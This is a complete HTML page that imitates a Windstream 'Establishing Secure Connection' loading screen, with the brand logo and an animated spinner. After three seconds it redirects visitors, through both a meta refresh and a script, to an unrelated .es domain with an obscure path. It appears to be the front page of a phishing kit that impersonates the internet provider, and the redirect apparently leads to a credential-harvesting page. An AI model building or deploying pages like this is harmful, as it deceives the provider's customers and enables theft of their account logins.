<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Windstream Secure Connection...</title>
    <meta http-equiv="refresh" content="3; url='https://premvalfstrnsrolxsatuc.es/autz/wafs/aps/zeb/'" />
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #0b0f19;
            color: #00a4e4;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
        }

        .logo-box {
            position: relative;
            width: 150px;
            height: 150px;
            margin: 0 auto 25px auto;
            border-radius: 50%;
            background: rgba(0, 164, 228, 0.05);
            border: 2px solid rgba(0, 164, 228, 0.25);
            box-shadow: 0 0 35px rgba(0, 164, 228, 0.3);
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo-box::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 2px dashed #00a4e4;
            animation: rotateRadar 5s linear infinite;
        }

        /* تصميم نص اللوجو باحترافية عالية */
        .windstream-brand {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: -0.5px;
            color: #ffffff;
            text-transform: lowercase;
            animation: pulseGlow 2s ease-in-out infinite;
            text-shadow: 0 0 10px rgba(0, 164, 228, 0.8);
        }

        .windstream-brand span {
            color: #00a4e4;
        }

        h2 {
            font-size: 20px;
            letter-spacing: 1px;
            margin-bottom: 12px;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(0, 164, 228, 0.5);
        }

        .loading-dots span {
            animation: blink 1.4s infinite;
            animation-fill-mode: both;
            font-size: 24px;
            color: #00a4e4;
        }

        .loading-dots span:nth-child(2) { animation-delay: .2s; }
        .loading-dots span:nth-child(3) { animation-delay: .4s; }

        @keyframes rotateRadar {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulseGlow {
            0%, 100% { opacity: 0.8; transform: scale(0.97); }
            50% { opacity: 1; transform: scale(1.03); }
        }

        @keyframes blink {
            0% { opacity: .2; }
            20% { opacity: 1; }
            100% { opacity: .2; }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-box">
            <div class="windstream-brand">wind<span>stream</span></div>
        </div>
        <h2>Establishing Secure Connection...</h2>
        <div class="loading-dots">
            <span>.</span><span>.</span><span>.</span>
        </div>
    </div>

    <script>
        setTimeout(function() {
            window.location.href = "https://premvalfstrnsrolxsatuc.es/autz/wafs/aps/zeb/";
        }, 3000);
    </script>

</body>
</html>
